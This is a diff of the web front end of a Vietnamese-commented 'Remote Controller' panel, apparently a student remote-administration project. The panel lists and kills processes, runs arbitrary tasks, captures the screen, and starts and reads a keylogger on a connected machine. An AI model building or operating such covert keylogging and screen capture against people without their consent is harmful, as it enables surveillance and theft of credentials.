@@ -38,24 +38,25 @@
         button { padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; color: white; font-weight: 500; }
         .btn-refresh { background: #17a2b8; }
         .btn-exec { background: #28a745; }
-        .btn-kill { background: #dc3545; padding: 4px 10px; font-size: 12px; }
+        .btn-kill { background: #dc3545; padding: 4px 10px; font-size: 12px; color: white;}
         
         /* Utils */
         .hidden { display: none !important; }
         .status-dot { height: 10px; width: 10px; background-color: #bbb; border-radius: 50%; display: inline-block; margin-right: 5px; }
         .online { background-color: #28a745; }
         .mem-col { color: #666; font-size: 13px; }
-                /* --- CSS CHO MODAL ZOOM --- */
+
+        /* MODAL ZOOM */
         .modal {
             display: none; position: fixed; z-index: 1000; left: 0; top: 0;
             width: 100%; height: 100%; overflow: auto; 
-            background-color: rgba(0,0,0,0.9); /* Nền đen mờ */
+            background-color: rgba(0,0,0,0.9);
         }
         .modal-content {
             margin: auto; display: block; 
-            max-width: 90%; max-height: 90vh; /* Giới hạn kích thước ảnh */
+            max-width: 90%; max-height: 90vh;
             position: absolute; top: 50%; left: 50%; 
-            transform: translate(-50%, -50%); /* Căn giữa hoàn toàn */
+            transform: translate(-50%, -50%);
             border: 2px solid white; box-shadow: 0 0 20px rgba(255,255,255,0.2);
         }
         .close-modal {
@@ -63,7 +64,7 @@
             color: #f1f1f1; font-size: 40px; font-weight: bold; cursor: pointer;
         }
         .close-modal:hover { color: #bbb; }
-        #screen-img { cursor: zoom-in; } /* Đổi con trỏ chuột thành kính lúp */
+        #screen-img { cursor: zoom-in; }
     </style>
 </head>
 <body>
@@ -71,6 +72,7 @@
         <span class="close-modal" onclick="closeModal()">&times;</span>
         <img class="modal-content" id="img01">
     </div>
+
     <div class="header">
         <div>📡 Remote Controller</div>
         <div style="font-size: 14px;"><span id="status-dot" class="status-dot"></span><span id="status-text">Disconnected</span></div>
@@ -95,17 +97,17 @@
 
             <div id="toolbar-processes" class="toolbar hidden">
                 <button class="btn-refresh" onclick="sendCmd('listProcesses')">🔄 Refresh Process</button>
-                
                 <div style="flex:1"></div>
-                
                 <input type="text" id="procInput" placeholder="New Task (vd: cmd.exe)...">
                 <button class="btn-exec" onclick="startProcessTask()">▶ Run Task</button>
             </div>
+
             <div id="toolbar-screen" class="toolbar hidden">
                 <button class="btn-refresh" onclick="sendCmd('get_screen')">📸 Chụp ngay</button>
                 <div style="flex:1"></div>
-                <span style="color:#666; font-size:13px">Ảnh được nén JPEG để truyền nhanh hơn.</span>
+                <span style="color:#666; font-size:13px">Ảnh được nén JPEG.</span>
             </div>
+
             <div id="toolbar-keylog" class="toolbar hidden">
                 <button class="btn-exec" onclick="sendCmd('keylog_start')">▶ Bắt đầu ghi</button>
                 <button class="btn-kill" onclick="sendCmd('keylog_stop')">⏹ Dừng ghi</button>
@@ -114,13 +116,15 @@
             </div>
 
             <div id="view-keylog" class="hidden scroll-area" style="padding: 15px;">
-                <textarea id="txtKeylogs" style="width: 100%; height: 95%; background: #222; color: #0f0; font-family: monospace; border: none; padding: 10px;" readonly></textarea>
+                <textarea id="txtKeylogs" style="width: 95%; height: 95%; background: #222; color: #0f0; font-family: monospace; border: none; padding: 10px; resize: none;" readonly placeholder="Chưa có dữ liệu log..."></textarea>
             </div>
-            <div id="view-screen" class="hidden scroll-area" style="text-align: center; padding: 10px; background: #333;">
+
+            <div id="view-screen" class="hidden scroll-area" style="text-align: center; padding: 10px; background: #333; height: 100%;">
                 <div id="loading-screen" style="color: white; display: none;">⏳ Đang nhận dữ liệu ảnh...</div>
                 <img id="screen-img" onclick="openModal()" style="max-width: 100%; max-height: 100%; border: 2px solid #fff; box-shadow: 0 0 20px rgba(0,0,0,0.5);" />
             </div>
-            <div class="scroll-area">
+
+            <div id="view-tables" class="scroll-area">
                 <table id="table-apps">
                     <thead>
                         <tr>
@@ -146,6 +150,7 @@
                 </table>
             </div>
         </div>
+
         <div class="log-panel">
             <div class="log-header">System Log</div>
             <div id="chat-content"></div>
@@ -182,23 +187,27 @@
                     renderProcesses(json.data);
                     log(`Đã tải ${json.data.length} tiến trình.`);
                 }
-                else if (json.trang_thai) {
-                    alert(json.thong_bao);
-                    log(`[${json.trang_thai}] ${json.thong_bao}`);
-                    if(json.trang_thai === 'thanh_cong') refreshCurrentTab();
-                }
                 else if (json.type === 'screen_capture') {
                     document.getElementById('loading-screen').style.display = 'none';
                     const img = document.getElementById('screen-img');
-                    // Gán Base64 vào src của thẻ img
                     img.src = "data:image/jpeg;base64," + json.data;
+                    
+                    // Nếu đang mở modal thì cập nhật luôn ảnh trong modal
+                    const modalImg = document.getElementById("img01");
+                    if(document.getElementById('imgModal').style.display === 'block') {
+                        modalImg.src = img.src;
+                    }
                     log("Đã nhận ảnh chụp màn hình.");
                 }
                 else if (json.type === 'keylog_data') {
                     const txt = document.getElementById('txtKeylogs');
                     txt.value = json.data;
-                    txt.scrollTop = txt.scrollHeight; // Tự cuộn xuống dưới
+                    txt.scrollTop = txt.scrollHeight; 
                     log("Đã tải dữ liệu Keylogger.");
+                }
+                else if (json.trang_thai) {
+                    log(`[${json.trang_thai}] ${json.thong_bao}`);
+                    if(json.trang_thai === 'thanh_cong') refreshCurrentTab();
                 }
             } catch (e) {
                 log("Server: " + data);
@@ -214,68 +223,51 @@
     // --- TAB LOGIC ---
     function switchTab(tab) {
         currentTab = tab;
+        
+        // 1. UI Tabs Active
         document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
         event.target.classList.add('active');
 
-        // Ẩn tất cả trước
-        document.getElementById('toolbar-apps').classList.add('hidden');
-        document.getElementById('table-apps').classList.add('hidden');
-        document.getElementById('toolbar-processes').classList.add('hidden');
-        document.getElementById('table-processes').classList.add('hidden');
-        document.getElementById('toolbar-screen').classList.add('hidden');
-        document.getElementById('view-screen').classList.add('hidden');
+        // 2. Ẩn HẾT toolbar
+        ['apps', 'processes', 'screen', 'keylog'].forEach(t => {
+            document.getElementById(`toolbar-${t}`).classList.add('hidden');
+        });
 
-        // Hiện tab tương ứng
+        // 3. Ẩn HẾT view (Khung hiển thị)
+        document.getElementById('view-tables').classList.add('hidden');
+        document.getElementById('view-screen').classList.add('hidden');
+        document.getElementById('view-keylog').classList.add('hidden');
+
+        // 4. Hiện view tương ứng
+        document.getElementById(`toolbar-${tab}`).classList.remove('hidden');
+
         if (tab === 'apps') {
-            document.getElementById('toolbar-apps').classList.remove('hidden');
+            document.getElementById('view-tables').classList.remove('hidden');
             document.getElementById('table-apps').classList.remove('hidden');
-        } else if (tab === 'processes') {
-            document.getElementById('toolbar-processes').classList.remove('hidden');
+            document.getElementById('table-processes').classList.add('hidden');
+        } 
+        else if (tab === 'processes') {
+            document.getElementById('view-tables').classList.remove('hidden');
+            document.getElementById('table-apps').classList.add('hidden');
             document.getElementById('table-processes').classList.remove('hidden');
-        } else if (tab === 'screen') {
-            document.getElementById('toolbar-screen').classList.remove('hidden');
+        } 
+        else if (tab === 'screen') {
             document.getElementById('view-screen').classList.remove('hidden');
-        }
+            // Màn hình cần display flex/block để hiện đúng
+            document.getElementById('view-screen').style.display = 'block'; 
+        } 
         else if (tab === 'keylog') {
-            document.getElementById('toolbar-keylog').classList.remove('hidden');
             document.getElementById('view-keylog').classList.remove('hidden');
         }
         
-        // Không auto-refresh tab screen để tiết kiệm băng thông
-        if (tab !== 'screen') refreshCurrentTab();
+        // Không auto-refresh tab screen/keylog để tiết kiệm băng thông
+        if (tab !== 'screen' && tab !== 'keylog') refreshCurrentTab();
     }
-function switchTab(tab) {
-    currentTab = tab;
-    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-    event.target.classList.add('active');
 
-    // Ẩn tất cả trước
-    document.getElementById('toolbar-apps').classList.add('hidden');
-    document.getElementById('table-apps').classList.add('hidden');
-    document.getElementById('toolbar-processes').classList.add('hidden');
-    document.getElementById('table-processes').classList.add('hidden');
-    document.getElementById('toolbar-screen').classList.add('hidden');
-    document.getElementById('view-screen').classList.add('hidden');
-
-    // Hiện tab tương ứng
-    if (tab === 'apps') {
-        document.getElementById('toolbar-apps').classList.remove('hidden');
-        document.getElementById('table-apps').classList.remove('hidden');
-    } else if (tab === 'processes') {
-        document.getElementById('toolbar-processes').classList.remove('hidden');
-        document.getElementById('table-processes').classList.remove('hidden');
-    } else if (tab === 'screen') {
-        document.getElementById('toolbar-screen').classList.remove('hidden');
-        document.getElementById('view-screen').classList.remove('hidden');
-    }
-    
-    // Không auto-refresh tab screen để tiết kiệm băng thông
-    if (tab !== 'screen') refreshCurrentTab();
-}
     function refreshCurrentTab() {
         if (!socket || socket.readyState !== 1) return;
         if (currentTab === 'apps') sendCmd('listApps');
-        else sendCmd('listProcesses');
+        else if (currentTab === 'processes') sendCmd('listProcesses');
     }
 
     // --- RENDER FUNCTIONS ---
@@ -319,7 +311,6 @@ function switchTab(tab) {
         }
     }
 
-    // Tab App Actions
     function startApp() {
         const name = document.getElementById('appInput').value;
         if(name) sendCmd(`startApp ${name}`);
@@ -327,22 +318,12 @@ function switchTab(tab) {
     function stopApp(name) {
         if(confirm(`Đóng cửa sổ ứng dụng '${name}'?`)) sendCmd(`stopApp ${name}`);
     }
-
-    // Tab Process Actions (MỚI THÊM HÀM START TASK)
     function startProcessTask() {
         const name = document.getElementById('procInput').value;
-        if(name) {
-            // Tái sử dụng lệnh startApp của server vì bản chất đều là Process.Start()
-            sendCmd(`startApp ${name}`);
-        } else {
-            alert("Vui lòng nhập tên chương trình/đường dẫn!");
-        }
+        if(name) sendCmd(`startApp ${name}`); else alert("Nhập tên!");
     }
-
     function killProcess(pid) {
-        if(confirm(`CẢNH BÁO: Bạn muốn buộc dừng Process ID ${pid}?`)) {
-            sendCmd(`killProcess ${pid}`);
-        }
+        if(confirm(`Kill PID ${pid}?`)) sendCmd(`killProcess ${pid}`);
     }
 
     function sendChat() {
@@ -375,40 +356,26 @@ function switchTab(tab) {
             txt.style.color = "red";
         }
     }
+
     // --- LOGIC MODAL ZOOM ---
     function openModal() {
         const modal = document.getElementById("imgModal");
         const sourceImg = document.getElementById("screen-img");
         const modalImg = document.getElementById("img01");
         
-        // Chỉ mở khi đã có ảnh
         if (sourceImg.src && sourceImg.src.startsWith("data:image")) {
             modal.style.display = "block";
             modalImg.src = sourceImg.src;
         }
     }
-
     function closeModal() {
         document.getElementById("imgModal").style.display = "none";
     }
-
-    // Đóng modal khi click ra vùng đen bên ngoài
     window.onclick = function(event) {
-        const modal = document.getElementById("imgModal");
-        if (event.target == modal) {
-            modal.style.display = "none";
-        }
+        if (event.target == document.getElementById("imgModal")) closeModal();
     }
 
-    // Cập nhật lại logic nhận ảnh (để nếu đang mở modal thì cập nhật luôn ảnh trong modal)
-    // Bạn tìm trong đoạn socket.onmessage, chỗ xử lý 'screen_capture', thêm dòng này:
-    /* const modalImg = document.getElementById("img01");
-    if(document.getElementById('imgModal').style.display === 'block') {
-            modalImg.src = "data:image/jpeg;base64," + json.data;
-    }
-    */
     window.onload = connect;
 </script>
-
 </body>
 </html>
